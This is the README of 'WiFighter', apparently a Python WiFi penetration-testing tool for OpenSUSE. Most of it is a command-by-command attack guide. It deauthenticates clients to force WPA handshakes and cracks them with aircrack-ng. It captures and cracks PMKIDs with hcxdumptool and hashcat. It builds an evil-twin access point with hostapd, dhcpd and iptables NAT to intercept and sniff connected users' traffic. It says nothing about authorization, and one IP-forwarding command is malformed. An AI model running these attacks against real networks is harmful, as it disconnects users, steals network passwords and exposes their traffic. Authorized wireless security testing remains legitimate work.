# WiFighter
Easy-to-use python WiFi pen-testing tool for OpenSUSE.
Utilizes aircrack-ng, hcxtools, hashcat and it's own mechanisms for wifi network scanning and executing common wifi attacks.

--------------------------------------------------------------------

## Installation 

Clone the project
```sh
git clone https://github.com/FilipStruhar/WiFighter.git
```

Enter the project folder
```sh
cd WiFighter
```

Make the install script executable
```sh
sudo chmod +x install.sh
```

Run install script
```sh
sudo ./install.sh
```

Run the tool
```sh
sudo wifighter
```

--------------------------------------------------------------------

## !! IMPORTANT !! - Read before use
- **Evil Twin Attack - disconnect all other internet connected interfaces than the one selected as "Internet interface"**
- **Evil Twin Attack - hcxdumptool stops capturing PMKIDs on interface chosen as "Evil Twin interface" after the Evil Twin attack ends... sometimes reseting NIC drivers with modprobe, replugging NIC or rebooting helped. It's somehow caused by the hostapd...**

## Future visions
- Choose more wordlists at once for cracking
- Cracking with hashcat GPU
- Generating wordlists
- NIC, device info in reports

--------------------------------------------------------------------

### 1. WPA/WPA2 Handshake Crack using aircrack-ng

**Monitor mode**

Set interface to monitor
```sh
sudo airmon-ng start <INTERFACE>
```

Set interface to managed
```sh
sudo airmon-ng stop <INTERFACE>mon
```

**Scan nearby WiFi's**

Scan all
```sh
sudo airodump-ng <INTERFACE>mon
```

Scan 2.4GHz WiFi's
```sh
sudo airodump-ng --band gb <ESSID> <INTERFACE>mon
```

Scan 5GHz WiFi's
```sh
sudo airodump-ng --band a <ESSID> <INTERFACE>mon
```

**Capture handshake**

Listen for handshake of specified AP
```sh
sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w <OUTPUT_FILE> <INTERFACE>mon
```

**Deauth clients (force handshake)**

Deauth all (broadcast)
```sh
sudo aireplay-ng -0 1 -a <BSSID> <INTERFACE>mon
```

Deauth client
```sh
sudo aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>mon
```

Verify captured handshake
```sh
sudo aircrack-ng <HANDSHAKE>.cap 
```

**Crack handshake**

```sh
sudo aircrack-ng -w <WORDLIST> -b <TARGET_AP_MAC> <HANDSHAKE>.cap
```

--------------------------------------------------------------------

### PMKID Attack
Compile needed hcxtools & install it's dependencies
```sh
git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools

sudo zypper in *gcc *libopenssl3 libopenssl-devel *libz1 *libz-devel *libcurl4 libcurl-devel *pkgconf-pkg-config

sudo make install


git clone https://github.com/ZerBea/hcxdumptool.git  # Install version 6.2.6
cd hcxdumptool

sudo make install
```

Install and setup hashcat
```sh
sudo zypper in hashcat pocl
```


Put wireless NIC into monitor
```sh
wifighter start <INTERFACE>
```

Capture PMKID
```sh
sudo hcxdumptool -o <OUTPUT_CAPTURE_FILE> -i <INTERFACE> -c <CHANNEL> --enable_status=3 --filtermode=2 --filterlist_ap=<TARGET_AP_MAC>
```

Convert capture into the hash format
```sh
hcxpcapngtool -o <OUTPUT_PMKID_HASH_FILE> <CAPTURED_PMKID>
```

Crack the PMKID
```sh
sudo hashcat -D 1 -a 0 -m 22000 --potfile-path=/dev/null <PMKID_HASH_FILE> <WORDLIST> -o <OUTPUT_FILE>
```

--------------------------------------------------------------------

### Evil Twin

**-MITM/Sniffer- Mode**

Install dependencies
```sh
sudo zypper in hostapd dhcp-server iptables
```

Set dhcp server's listenning interface
```sh
nano /etc/sysconfig/dhcpd 
```
```sh
DHCPD_INTERFACE="<EVIL_AP_INTERFACE>"
```

Set dhcp server's configuration
```sh
nano /etc/dhcpd.conf
```
```sh
option domain-name "local";
option domain-name-servers 8.8.8.8, 8.8.4.4;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.100.0 netmask 255.255.255.0 {
    range 192.168.100.2 192.168.100.254;
    option subnet-mask 255.255.255.0;
    option routers 192.168.100.1;
    option broadcast-address 192.168.100.255;
}
```

Set evil AP's configuration
```sh
nano /etc/hostapd.conf
```
```sh
interface=<EVIL_AP_INTERFACE>
driver=nl80211

ssid=<SSID>
channel=<CHANNEL>

hw_mode=g
ieee80211n=1
wme_enabled=1
macaddr_acl=0
```

Configure evil AP's interface
```sh
sudo ip addr add 192.168.100.1/24 dev <EVIL_AP_INTERFACE>
```

Enable internet connection for clients
```sh
sudo iptables -t nat -A POSTROUTING -s 192.168.100.0/24 -o <INTERNET_INTERFACE> -j MASQUERADE

sudo iptables -A FORWARD -i <EVIL_AP_INTERFACE> -o <INTERNET_INTERFACE> -j ACCEPT

sudo iptables -A FORWARD -i <INTERNET_INTERFACE> -o <EVIL_AP_INTERFACE> -m state --state RELATED,ESTABLISHED -j ACCEPT

sudo tee | echo 1 > /proc/sys/net/ipv4/ip_forward
```

Prevent NetworkManager from managing the evil ap's interface
```sh
sudo nmcli dev set <EVIL_AP_INTERFACE> managed no
```

Start the fake AP
```sh
systemctl restart dhcpd
systemctl restart hostapd
```

Sniff <EVIL_INTERFACE> traffic using tshark/wireshark/tcpdump...

Return back to normal state
```sh
systemctl stop dhcpd
systemctl stop hostapd
sudo iptables -F
sudo iptables -t nat -F
sudo tee | echo 0 > /proc/sys/net/ipv4/ip_forward
sudo nmcli dev set <EVIL_AP_INTERFACE> managed yes
sudo ip addr del 192.168.100.1/24 dev <EVIL_AP_INTERFACE>
sudo systemctl restart NetworkManager
```



--------------------------------------------------------------------

### WPS Attack - Reaver
Dependencies
```sh
sudo zypper in aircrack-ng
```
```sh
pixiewps - GitHub
```
```sh
libpcap - Repo
```

--------------------------------------------------------------------